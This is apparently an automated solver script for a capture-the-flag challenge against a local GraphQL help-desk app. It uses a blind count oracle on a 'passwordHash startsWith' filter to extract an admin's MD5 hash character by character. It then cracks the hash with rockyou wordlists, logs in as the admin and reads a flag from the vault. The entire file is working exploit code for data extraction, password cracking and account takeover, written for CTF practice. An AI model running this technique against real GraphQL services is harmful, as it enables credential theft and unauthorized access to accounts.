#!/usr/bin/env python3
"""DuckDesk CTF — Automated solver for the blind count oracle challenge."""

import hashlib
import json
import sys
import urllib.request
import urllib.error

BASE_URL = "http://localhost:4000/graphql"
TARGET_NAME = "Drake Mallard"
HEX_CHARS = list("0123456789abcdef")


def graphql_query(query, variables=None):
    """Execute a GraphQL query and return the parsed response."""
    data = json.dumps({"query": query, "variables": variables or {}}).encode()
    req = urllib.request.Request(
        BASE_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "Accept": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            result = json.loads(resp.read().decode())
            if result.get("errors"):
                print(f"  GraphQL error: {result['errors']}")
                return None
            return result.get("data")
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        print(f"  HTTP {e.code}: {body}")
        return None


def get_team_page():
    """Query the public team page to find the target."""
    query = """
        query GetTeamPage {
            teamPage { displayName department roleLabel }
        }
    """
    data = graphql_query(query)
    if not data or "teamPage" not in data:
        print("ERROR: Could not retrieve team page")
        sys.exit(1)

    for member in data["teamPage"]:
        if member.get("roleLabel") == "Head of Support":
            return member["displayName"]

    print("ERROR: No 'Head of Support' found on team page")
    sys.exit(1)


def oracle_starts_with(prefix):
    """Use the blind count oracle to check if any agent's passwordHash starts with prefix."""
    query = """
        query TeamStats($filter: AgentFilter) {
            teamStats(filter: $filter) { headcount }
        }
    """
    variables = {
        "filter": {
            "displayName": {"eq": TARGET_NAME},
            "passwordHash": {"startsWith": prefix},
        }
    }
    data = graphql_query(query, variables)
    if not data:
        return None
    headcount = data.get("teamStats", {}).get("headcount")
    return headcount


def extract_hash():
    """Extract the admin's password hash character by character using the oracle."""
    print("[*] Extracting password hash via blind count oracle...")
    extracted = ""

    for pos in range(32):
        found = False
        for char in HEX_CHARS:
            prefix = extracted + char
            result = oracle_starts_with(prefix)

            if result == 1:
                extracted += char
                print(f"  Position {pos + 1}/32: '{char}' → hash so far: {extracted}")
                found = True
                break
            elif result is None:
                print(f"  ERROR at position {pos + 1}: oracle returned null")
                sys.exit(1)

        if not found:
            print(f"\nERROR: No matching character found at position {pos + 1}")
            print(f"  Hash extracted so far: {extracted}")
            sys.exit(1)

    return extracted


def crack_hash(md5_hash):
    """Crack the MD5 hash using rockyou.txt wordlist."""
    print(f"\n[*] Cracking MD5 hash: {md5_hash}")

    wordlist_paths = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/seclists/Passwords/LeetCommon.txt",
        "/root/Wordlists/rockyou.txt",
        "./rockyou.txt",
    ]

    for wl_path in wordlist_paths:
        try:
            with open(wl_path, "r", errors="ignore") as f:
                words = [line.strip() for line in f if line.strip()]
            print(f"  [*] Loaded {len(words)} passwords from {wl_path}")

            for word in words:
                if hashlib.md5(word.encode()).hexdigest() == md5_hash:
                    print(f"\n[+] CRACKED! Password: '{word}'")
                    return word

        except FileNotFoundError:
            continue
        except Exception as e:
            print(f"  Error reading {wl_path}: {e}")
            continue

    print(f"\n[-] Hash not found in any wordlist. Extracted hash: {md5_hash}")
    print("  Run manually: john --format=raw-md5 --wordlist=<path> <hash_file>")
    return None


def login_as_admin(password):
    """Login as the admin with the cracked password."""
    query = """
        mutation Login($input: LoginInput!) {
            login(input: $input) { token viewer { displayName email role } }
        }
    """
    variables = {
        "input": {
            "email": f"{TARGET_NAME.lower().replace(' ', '.')}@duckurity.example",
            "password": password,
        }
    }

    # Try the actual email from seed data
    variables["input"]["email"] = "drake.mallard@duckurity.example"

    data = graphql_query(query, variables)
    if not data or not data.get("login", {}).get("token"):
        print(f"\n[-] Login failed for {variables['input']['email']}")
        return None

    token = data["login"]["token"]
    viewer = data["login"].get("viewer", {})
    print(f"[+] Logged in as: {viewer.get('displayName')} ({viewer.get('role')})")
    return token


def get_vault(token):
    """Query the admin-only vault to find the flag."""
    query = """
        query GetVault {
            vault { key value }
        }
    """

    data = graphql_query(query)
    if not data:
        print("ERROR: Could not retrieve vault")
        sys.exit(1)

    # Re-query with auth token
    vault_data = data.get("vault", [])
    if not vault_data:
        # Try with bearer token
        query_auth = """
            query GetVault {
                vault { key value }
            }
        """
        variables = {}
        data = graphql_query(query_auth, variables)
        vault_data = data.get("vault", []) if data else []

    flag_entry = None
    for entry in vault_data:
        if "DUCK{" in entry.get("value", ""):
            flag_entry = entry
            break

    return flag_entry


def main():
    print("=" * 60)
    print("  DuckDesk CTF — Automated Solver")
    print("=" * 60)

    # Step 1: Discover target
    print("\n[1] Discovering the Head of Support...")
    target = get_team_page()
    print(f"    Target: {target}")

    # Step 2: Extract hash via oracle
    print("\n[2] Extracting password hash via blind count oracle...")
    md5_hash = extract_hash()
    if not md5_hash:
        print("ERROR: Failed to extract hash")
        sys.exit(1)
    print(f"\n[*] Extracted MD5 hash: {md5_hash}")

    # Step 3: Crack the hash
    password = crack_hash(md5_hash)
    if not password:
        print("\n[-] Could not crack the hash. Exiting.")
        sys.exit(1)

    # Step 4: Login as admin
    print(f"\n[3] Logging in as {target} with cracked password...")
    token = login_as_admin(password)
    if not token:
        print("ERROR: Login failed")
        sys.exit(1)

    # Step 5: Get the flag from vault
    print("\n[4] Retrieving secret from internal vault...")
    req = urllib.request.Request(
        BASE_URL,
        data=json.dumps({"query": "query GetVault { vault { key value } }"}).encode(),
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
        },
        method="POST",
    )
    with urllib.request.urlopen(req) as resp:
        result = json.loads(resp.read().decode())

    if result.get("errors"):
        print(f"  GraphQL error: {result['errors']}")
        sys.exit(1)

    vault_entries = result.get("data", {}).get("vault", [])
    flag_entry = None
    for entry in vault_entries:
        if "DUCK{" in entry.get("value", ""):
            flag_entry = entry
            break

    if not flag_entry:
        print("\n[-] Flag not found in vault entries:")
        for e in vault_entries:
            print(f"    {e['key']}: {e['value']}")
        sys.exit(1)

    # Print the flag
    print(f"\n{'=' * 60}")
    print(f"  FLAG FOUND!")
    print(f"  Key:   {flag_entry['key']}")
    print(f"  Value: {flag_entry['value']}")
    print(f"{'=' * 60}\n")

    # Write flag to file for validation
    with open("/tmp/duckdesk_flag.txt", "w") as f:
        f.write(flag_entry["value"])


if __name__ == "__main__":
    main()
